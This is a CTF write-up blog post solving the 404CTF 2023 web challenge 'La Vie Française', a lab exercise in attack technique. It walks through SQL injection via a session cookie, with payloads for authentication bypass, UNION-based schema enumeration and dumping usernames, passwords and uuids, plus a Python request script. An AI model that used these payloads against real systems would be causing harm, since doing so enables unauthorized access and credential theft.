---
title: CTFs | 404CTF2023 | Web | La Vie Française
author: Stillwolfing
date: 2023-06-05
categories: [CTFs, 404CTF2023, Web]
tags: [CTFs, 404CTF2023, Web, Sqli]
permalink: /CTFs/404CTF2023/web/la_vie_francaise
---

Here is the context:

![context](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/context.png)


By clicking the link, we end on the journal's website:

![home](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/home.png)

Let's try to postulate:

![register](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/register.png)

It's a register page. We register with a random username, "bipboup".

We are redirected to a login page:

![login](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/login.png)

After connecting, we are on our account page:

![account](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/account.png)

We have got a cookie named "uuid" which identify us on the website.

![cookie](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/cookie.png)

I could not decrypt the cookie. I thought that maybe the cookie is stored in the database and the username is retrieved with an sql query that could look like.

```sql
select username from users where uuid = <uuid>;
```

Maybe the way the sql query is made is vulnerable to sql injections.

So I tried this:

I added "' or 1=1-- -" after the my cookie to try to select the first row.

![poc](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/poc.png)

It worked, I'm connected as Jacques Rival.

I created a script to craft my requests:

```python
import requests
from bs4 import BeautifulSoup

url = "https://la-vie-francaise.challenges.404ctf.fr/account"
sep = "0x207c20"

payload = f""

cookies = {'uuid': payload}

r = requests.get(url, cookies=cookies).text
r = r.replace(",", "\n")

if "Connexion" in r:
    print("Courage, tu y es presque !")
else:
    soup = BeautifulSoup(r, 'html.parser')
    print(soup.find("h3").text)
    print("Bravo !")

```

We just have to replace the payload with our payload.

I tried a union based sqli. I tried a request like:

```sql
' UNION SELECT 1-- -
```

I increased the number of row until I reach the good number of row of the query.

with:
```sql
' UNION SELECT 1, 2, 3-- -
```

I get this output:

![union_poc](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/union_poc.png)

Ok so we need 3 arguments and the first one is displayed on the screen.

Let's try to get the version of the database:

```sql
' UNION SELECT version(), 2, 3-- -
```

![union_version](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/union_version.png)

The engine is a MariaDB.

Let's get the tables under this database(There are more like system tables and other ones could be created).

```sql
' UNION SELECT group_concat(table_name), 2, 3 from information_schema.tables where table_schema=database()-- -
```

![union_table](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/union_table.png)

There is a table user. We need to know the columns of the table:

```sql
' UNION SELECT group_concat(column_name), 2, 3 from information_schema.columns where table_name='users'-- -
```

![union_columns](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/union_columns.png)

Now we can dump the table:

```sql
' UNION SELECT group_concat(uuid, {sep} , username, {sep}, password), 2, 3 from users-- -
```

![union_dump](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/union_dump.png)

We have madelaineforestier's password and uuid. We can connect using both.

Let's use the uuid:


![madelaine_forestier_account](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/madelaine_forestier_account.png)

On the admin panel:

![flag](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/flag.png)

We've got the flag 🥳 !!

I hope you learned something through this writeup 😉

Oh wait, I almost forgot to flex !

![first_blood](/assets/img/CTFs/404CTF2023/web/la_vie_francaise/first_blood.png)


